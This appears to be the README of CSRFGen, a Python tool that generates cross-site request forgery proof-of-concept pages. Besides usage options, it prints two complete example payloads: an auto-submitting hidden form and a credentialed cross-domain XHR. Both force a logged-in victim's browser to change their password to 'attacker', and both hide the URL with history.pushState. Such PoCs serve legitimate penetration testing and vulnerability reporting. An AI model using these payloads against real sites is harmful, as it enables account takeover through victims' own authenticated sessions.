# CSRFGen:
<b>It's a tool to automate the process of generating CSRF PoC based on python</b><br>
<br>

# Installation :
<code>https://github.com/AIGEOO/CSRFGen.git<code>
<br>

# Requirements :

<code>pip install -r requirements.txt</code>

# Options :

```
usage: main.py [-h] [-m METHOD] [-u URL] [-p PARAMETERS] [-a AUTHOR] [-e ENCRYPT] [--xhr]

This is CSRF PoC generator

options:
  -h, --help            show this help message and exit
  -m METHOD, --method METHOD
                        The request Method [GET] or [POST]
  -u URL, --url URL     The Attacker URL
  -p PARAMETERS, --parameters PARAMETERS
                        The Request Parameters
  -a AUTHOR, --author AUTHOR
                        The Author Name
  -e ENCRYPT, --encrypt ENCRYPT
                        The form reqest encryption type [application/x-www-form-urlencoded] or [multipart/form-data]
                        or [text/plain]
  --xhr                 This will implement the Cross-domian XHR PoC
```

# Usage :

<p>Ex1: Generate the PoC with autosubmit</p>

```
C:Users\User\CSRFGen>python main.py -m POST -u "http://example.com" -p "new_password=attacker&conf_password=attacker" -a "attacker" -e "application/x-www-form-urlencoded"
<html>
  <title>
    This CSRF was found by attacker
  </title>
  <body>
    <script>history.pushState("", "", "/")</script>
    <h1>
      This POC was Created By
    </h1>
    <form action="http://example.com" method="POST" enctype="application/x-www-form-urlencoded">
      <input type="hidden" name="new_password" value="attacker" />
      <input type="hidden" name="conf_password" value="attacker" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
The PoC file was created in results folder with poc.html name
```

<p>Ex2: Generate the PoC with Cross-domain XHR</p>

```
C:\Users\User\CSRFGen>python main.py -m POST -u "http://example.com" -p "new_password=attacker&conf_password=attacker" -a "attacker" -e "application/x-www-form-urlencoded" --xhr
<html>
  <title>
    This CSRF was found by attacker
  </title>
  <body>
    <script>history.pushState("", "", "/")</script>
    <script>function submitRequest() {var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://example.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); var body = 'new_password=attacker&amp;conf_password=attacker'; xhr.withCredentials = true; var aBody = new Uint8Array(body.length); for (var i = 0; i &lt; aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody]));}</script>
    <h1>
      This POC was Created By CSRFGen
    </h1>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
The PoC file was created in results folder with poc.html name
```